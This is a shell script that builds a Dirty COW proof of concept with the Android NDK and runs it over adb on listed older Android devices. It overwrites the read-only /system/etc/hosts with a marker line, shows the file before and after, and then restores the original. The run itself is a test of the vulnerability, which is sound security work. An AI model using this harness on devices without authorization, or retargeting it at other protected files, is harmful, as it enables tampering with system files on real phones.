#!/bin/sh -x

# is05  	2.3.4	2.6.35.7	API level 10
# isw11sc	4.0.4	3.0.15  	API level 15
# kyl22 	4.2.2	3.4.0   	API level 17
# htv32 	6.0.1	3.18.20 	API level 23

DEVICE=is05

#
# Build
#
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-10


#
# Push
#
#adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
#adb push libs/armeabi/run-as /data/local/tmp/run-as
adb push libs/armeabi-v7a/dirtycow /data/local/tmp/dirtycow
adb push libs/armeabi-v7a/run-as /data/local/tmp/run-as

#
# Prepare test file as default.prop
#
mkdir ${DEVICE}
echo "#PoC dirtycow succeeded!" > ${DEVICE}/hosts
adb pull /system/etc/hosts ${DEVICE}/hosts.orig

adb push ${DEVICE}/hosts      /data/local/tmp/hosts
adb push ${DEVICE}/hosts.orig /data/local/tmp/hosts.orig


#
# Before execution
#
adb shell 'cat /system/build.prop' | grep model
adb shell 'cat /system/build.prop' | grep description
echo ""
echo "----- before PoC -----"
adb shell 'cat /system/etc/hosts'


#
# Execute PoC
#
adb shell '/data/local/tmp/dirtycow /system/etc/hosts /data/local/tmp/hosts'

#
# Confirm whether PoC is succeeded.
#
echo ""
echo "----- after PoC -----"
adb shell 'cat /system/etc/hosts'


#
# Revert to original file.
#
echo ""
adb shell '/data/local/tmp/dirtycow /system/etc/hosts /data/local/tmp/hosts.orig'



echo ""
echo "----- Target file Reverted  -----"
adb shell 'cat /system/etc/hosts'


